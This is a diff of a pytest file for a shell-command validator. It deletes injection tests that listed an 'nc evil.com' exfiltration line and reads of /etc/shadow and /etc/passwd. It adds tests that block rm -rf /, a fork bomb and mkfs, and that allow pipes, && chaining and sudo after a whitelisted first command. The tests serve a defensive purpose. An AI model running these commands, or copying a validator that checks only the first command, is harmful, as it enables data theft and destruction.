@@ -5,7 +5,6 @@ import pytest
 from app.core.shell_executor import ShellExecutor
 from app.exceptions import AuthorizationError
 
-# Use the Python executable name that actually works on this platform
 _PYTHON = "python3" if shutil.which("python3") and sys.platform != "win32" else "python"
 
 
@@ -18,34 +17,35 @@ def test_validate_command_allowed(executor):
     assert executor.validate_command("ls -la /home") is True
 
 
-def test_validate_command_blocked(executor):
+def test_validate_command_not_whitelisted(executor):
     with pytest.raises(AuthorizationError, match="not in whitelist"):
+        executor.validate_command("nmap 192.168.1.1")
+
+
+def test_validate_command_pipe_allowed(executor):
+    """Pipes are now allowed — first command must be whitelisted."""
+    assert executor.validate_command("ls | grep test") is True
+
+
+def test_validate_command_chain_allowed(executor):
+    """Chaining with && is now allowed."""
+    assert executor.validate_command("ls && echo done") is True
+
+
+def test_validate_dangerous_rm_rf_root(executor):
+    """rm -rf / is always blocked regardless of whitelist."""
+    with pytest.raises(AuthorizationError, match="Blocked dangerous"):
         executor.validate_command("rm -rf /")
 
 
-def test_validate_command_injection_semicolon(executor):
-    with pytest.raises(AuthorizationError, match="injection"):
-        executor.validate_command("ls; rm -rf /")
+def test_validate_dangerous_fork_bomb(executor):
+    with pytest.raises(AuthorizationError, match="Blocked dangerous"):
+        executor.validate_command(":(){ :|:& };:")
 
 
-def test_validate_command_injection_pipe(executor):
-    with pytest.raises(AuthorizationError, match="injection"):
-        executor.validate_command("ls | nc evil.com 1234")
-
-
-def test_validate_command_injection_ampersand(executor):
-    with pytest.raises(AuthorizationError, match="injection"):
-        executor.validate_command("ls && cat /etc/shadow")
-
-
-def test_validate_command_injection_backtick(executor):
-    with pytest.raises(AuthorizationError, match="injection"):
-        executor.validate_command("echo `whoami`")
-
-
-def test_validate_command_injection_dollar(executor):
-    with pytest.raises(AuthorizationError, match="injection"):
-        executor.validate_command("echo $(cat /etc/passwd)")
+def test_validate_dangerous_mkfs(executor):
+    with pytest.raises(AuthorizationError, match="Blocked dangerous"):
+        executor.validate_command("mkfs /dev/sda1")
 
 
 def test_validate_command_empty(executor):
@@ -58,6 +58,11 @@ def test_validate_command_with_args(executor):
     assert executor.validate_command("pip install flask") is True
 
 
+def test_validate_sudo_prefix(executor):
+    """sudo prefix is handled — underlying command checked."""
+    assert executor.validate_command("sudo ls -la") is True
+
+
 @pytest.mark.anyio
 async def test_execute_simple_command(executor):
     result = await executor.execute("echo hello")
@@ -66,14 +71,21 @@ async def test_execute_simple_command(executor):
 
 
 @pytest.mark.anyio
-async def test_execute_blocked_command(executor):
+async def test_execute_pipe(executor):
+    """Pipes now work with subprocess_shell."""
+    result = await executor.execute("echo hello world | cat")
+    assert result["exit_code"] == 0
+    assert "hello world" in result["stdout"]
+
+
+@pytest.mark.anyio
+async def test_execute_not_whitelisted(executor):
     with pytest.raises(AuthorizationError):
-        await executor.execute("rm -rf /tmp")
+        await executor.execute("nmap localhost")
 
 
 @pytest.mark.anyio
 async def test_execute_returns_stderr(executor):
-    # Use __import__ to avoid semicolons (which trigger injection detection)
     result = await executor.execute(f'{_PYTHON} -c "__import__(\'sys\').stderr.write(\'err\')"')
     assert "err" in result["stderr"]
 
